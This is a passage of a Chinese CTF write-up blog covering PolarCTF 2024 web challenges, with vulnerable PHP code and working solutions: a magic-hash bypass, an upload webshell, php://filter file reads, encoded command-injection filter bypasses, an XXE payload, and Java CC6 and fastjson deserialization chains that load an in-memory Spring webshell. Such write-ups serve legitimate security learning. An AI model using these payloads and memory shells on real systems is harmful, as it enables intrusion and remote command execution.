invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706141134699.png" alt="image-20240706141134699"></p><p>因为假flag都被调用了，那么cat肯定也被调用了，说明我们写的恶意函数已经被调用了。现在我们去123.php看看文件写进去没有。</p><p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706141249594.png" alt="image-20240706141249594"></p><p>拿到flag。</p><p>flag{0b5339cb-69d0-42ad-bf61-2c02ac4b5b3a}</p>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PolarCTF2024夏季个人挑战赛全wp</title>
    <link href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/"/>
    <url>/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<h1 id="扫扫看"><a href="#扫扫看" class="headerlink" title="扫扫看"></a>扫扫看</h1><p>不用扫，猜测是flag.php</p><p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610123154816.png" alt="image-20240610123154816"></p><blockquote><p>flag{094c9cc14068a7d18ccd0dd3606e532f}</p></blockquote><h1 id="debudao"><a href="#debudao" class="headerlink" title="debudao"></a>debudao</h1><p>flag在cookie里：</p><p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610124209641.png" alt="image-20240610124209641"></p><blockquote><p>flag{72077a55w312584wb1aaa88888cd41af}</p></blockquote><h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xxs&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$input</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xxs&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$input</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;错误：输入类型不允许为数组。&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^0e[0-9]+$/&quot;</span>, <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$input</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;错误：输入的MD5值必须以&#x27;0e&#x27;开头，并跟随数字。&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$input</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;错误：输入必须是数字。&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;恭喜：&quot;</span>.<span class="hljs-variable">$flag</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;错误：必须设置正确参数。&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>根据题意，我们需要输入纯数字进去，然后md5加密后是0e+数字的组合。</p><p>240610708的md5加密后是0e462097431906509019562988736854</p><p>所以输入xss&#x3D;240610708即可</p><blockquote><p>flag{1bc29b36f623ba82aaf6724fd3b16718}</p></blockquote><h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610124841926.png" alt="image-20240610124841926"></p><p>是前端检测，抓包传</p><p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610124951222.png" alt="image-20240610124951222"></p><p>进入123.php post传参：123&#x3D;system(“cat &#x2F;flag.txt”);</p><blockquote><p>flag{adbf5a778175ee757c34d0eba4e932bc}</p></blockquote><h2 id="Dragon"><a href="#Dragon" class="headerlink" title="Dragon"></a>Dragon</h2><p>还是在cookie里，什么了色题？</p><p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610125659356.png" alt="image-20240610125659356"></p><blockquote><p>flag{72077a551386b19fb1aea77814cd41af}</p></blockquote><h1 id="tnl"><a href="#tnl" class="headerlink" title="tnl"></a>tnl</h1><p>真傻逼，这题目输入3会报sql的错，但是这道题跟sql一点关系也没有，看wp才知道是普通的伪协议读文件他妈的真的</p><p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610131343532.png" alt="image-20240610131343532"></p><p>我说我怎么输，都会报twothree’的错草</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;twothree&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))<br>&#123;<br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;1&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;2&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))&#123;<br><span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;twothree&#x27;&#x27; at line 1&quot;</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>真傻逼</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">twothree=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/i</span>ndex/resource=flag<br></code></pre></td></tr></table></figure><blockquote><p>flag{29dba9019e40d75a5053b15f4f2906e1}</p></blockquote><h1 id="你知道sys还能这样玩吗"><a href="#你知道sys还能这样玩吗" class="headerlink" title="你知道sys还能这样玩吗"></a>你知道sys还能这样玩吗</h1><p>好家伙，开局403怼脸，来者不善，啥都没给，先猜，结果在sys.php有东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget/i&#x27;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>就过滤了普通一些特定组合命令，这里因为直接执行系统命令，可以用bash的做法做，我这里使用变量拼接：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ls /<br><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>a<span class="hljs-operator">=</span>l<span class="hljs-comment">;b=s;$a$b /;</span><br></code></pre></td></tr></table></figure><p>看到根目录有flag.txt，但是这里把<code>*</code> <code>?</code> <code>.</code>都过滤了，但是中括号还没有，可以用中括号的通配符：</p><figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs parser3"><span class="language-xml">cat /flag[</span><span class="hljs-keyword">^a</span><span class="language-xml">]txt</span><br><span class="language-xml">cmd=a=ca;b=t;c=fla;d=g[</span><span class="hljs-keyword">^a</span><span class="language-xml">]txt;</span><span class="hljs-variable">$a</span><span class="hljs-variable">$b</span><span class="language-xml"> /</span><span class="hljs-variable">$c</span><span class="hljs-variable">$d</span><span class="language-xml">;</span><br></code></pre></td></tr></table></figure><blockquote><p>flag{196b0f14eba66e10fba74dbf9e99c22f}</p></blockquote><h4 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h4><p>利用php -r 执行php代码，编码绕过</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cmd=php -r &#x27;system(hex2bin(&quot;<span class="hljs-number">63617420</span>2f666c<span class="hljs-number">6167</span>2e<span class="hljs-number">747874</span>&quot;));&#x27;<br></code></pre></td></tr></table></figure><p>不用双引号的版本：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cmd=php -r &#x27;system(hex2bin(ff3b<span class="hljs-number">63617420</span>2f666c<span class="hljs-number">6167</span>2e<span class="hljs-number">747874</span>));&#x27;<br></code></pre></td></tr></table></figure><p><img src="file:////home/yinyun/.config/QQ/nt_qq_82839f1201706a4c8cdc22423c5b3f9d/nt_data/Pic/2024-06/Ori/def9c1ccf5ba304f9de09359423b6f76.png" alt="img"></p><p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610141001972.png" alt="image-20240610141001972"></p><h4 id="法三："><a href="#法三：" class="headerlink" title="法三："></a>法三：</h4><p>printf和双引号绕过base64加密</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">cmd</span><span class="language-bash">=`<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;Y2F0IC9mbGFnLnR4dA==&quot;</span>|bas<span class="hljs-string">&quot;&quot;</span>e64 -d`</span><br></code></pre></td></tr></table></figure><h4 id="法四："><a href="#法四：" class="headerlink" title="法四："></a>法四：</h4><p>八进制转化</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cmd</span>=$%<span class="hljs-number">27</span>\<span class="hljs-number">143</span>\<span class="hljs-number">141</span>\<span class="hljs-number">164</span>%<span class="hljs-number">27</span>%<span class="hljs-number">3</span>c$%<span class="hljs-number">27</span>\<span class="hljs-number">57</span>\<span class="hljs-number">146</span>\<span class="hljs-number">154</span>\<span class="hljs-number">141</span>\<span class="hljs-number">147</span>\<span class="hljs-number">56</span>\<span class="hljs-number">164</span>\<span class="hljs-number">170</span>\<span class="hljs-number">164</span>%<span class="hljs-number">27</span><br></code></pre></td></tr></table></figure><h1 id="ExX"><a href="#ExX" class="headerlink" title="ExX"></a>ExX</h1><p>扫后台扫到了dom.php</p><p>报错有  DOMDocument::loadXML()</p><p>结合题目名字，猜测是xxe实体注入</p><p>直接上payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flagggg.php&quot;</span>&gt;</span> ]&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">xml</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xml</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610141823959.png" alt="image-20240610141823959"></p><p>PD9waHANCi8vZmxhZ3s3ZTk3ZThjNGY5ZDZiZTM1YWU4NTAwYjlmYjJjZGQzZX0NCg&#x3D;&#x3D;</p><blockquote><p>flag{7e97e8c4f9d6be35ae8500b9fb2cdd3e}</p></blockquote><p>然后困难部分就全是java了&#x3D;-&#x3D;</p><h1 id="CC链"><a href="#CC链" class="headerlink" title="CC链"></a>CC链</h1><p>cc6链，不出网打内存马，内存马下面给了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(<span class="hljs-keyword">final</span> Object obj) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">btout</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(btout);<br>        objOut.writeObject(obj);<br>        <span class="hljs-keyword">return</span> btout.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] serialized)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">btin</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(serialized);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objIn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(btin);<br>        <span class="hljs-keyword">return</span> objIn.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz1</span> <span class="hljs-operator">=</span> pool.get(SpringEcho.class.getName());<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz1.toBytecode()&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Infernity&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getClass&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, obj);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;key&quot;</span>);<br>        outerMap.remove(obj);<br>        setFieldValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br>        <span class="hljs-type">byte</span>[] obs = serialize(expMap);<br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(obs)));<br>        deserialize(obs);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ezJson"><a href="#ezJson" class="headerlink" title="ezJson"></a>ezJson</h1><p>fastjson-1.2.83原生反序列化。ysoserial有现成的exp。</p><p>只需要准备好回显内存马就行</p><p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20241203165944345.png" alt="image-20241203165944345"></p><p>具体怎么构造的链子，可以看<a href="https://www.bilibili.com/video/BV1Ds421g7pw/?vd_source=cd1ee3d9c8c623012da5b159695424ee&p=11&spm_id_from=333.788.videopod.sections">https://www.bilibili.com/video/BV1Ds421g7pw/?vd_source=cd1ee3d9c8c623012da5b159695424ee&amp;p=11&amp;spm_id_from=333.788.videopod.sections</a></p><p>shell.class：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.Memshell.fastjson1_nei_chun_ma;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">shell</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            org.springframework.web.context.request.<span class="hljs-type">RequestAttributes</span> <span class="hljs-variable">requestAttributes</span> <span class="hljs-operator">=</span> org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();<br>            javax.servlet.http.<span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">httprequest</span> <span class="hljs-operator">=</span> ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();<br>            javax.servlet.http.<span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">httpresponse</span> <span class="hljs-operator">=</span> ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();<br>            String[] cmd =  <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, httprequest.getHeader(<span class="hljs-string">&quot;Infernity&quot;</span>)&#125;;  <span class="hljs-comment">//请求头加一个Infernity后面加命令</span><br>            <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmd).start().getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next().getBytes();<br>            httpresponse.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(result));<br>            httpresponse.getWriter().flush();<br>            httpresponse.getWriter().close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span><br>            TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20241203170049279.png" alt="image-20241203170049279"></p><h1 id="FastJsonBCEL"><a href="#FastJsonBCEL" class="headerlink" title="FastJsonBCEL"></a>FastJsonBCEL</h1><p><a href="https://cloud.tencent.com/developer/article/2335078">https://cloud.tencent.com/developer/article/2335078</a></p><p>在<code>/parse</code>路由下存在<code>FastJson</code>解析可能存在反序列化漏洞。</p><p>查看pom.xml</p><p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20241203193250917.png" alt="image-20241203193250917"></p><p>注意到存在<code>tomcat-dbcp</code>依赖和<code>fastjson</code>依赖，且版本分别为<code>9.0.8</code>、 <code>1.2.24</code>。所以可以使用<code>FastJson</code>借助<code>tomcat-dbcp</code>实现BCEL字节码加载的方式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><span class="hljs-keyword">import</span> com.Utils.Util;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">byte</span>[] bytes = Util.file2ByteArray(<span 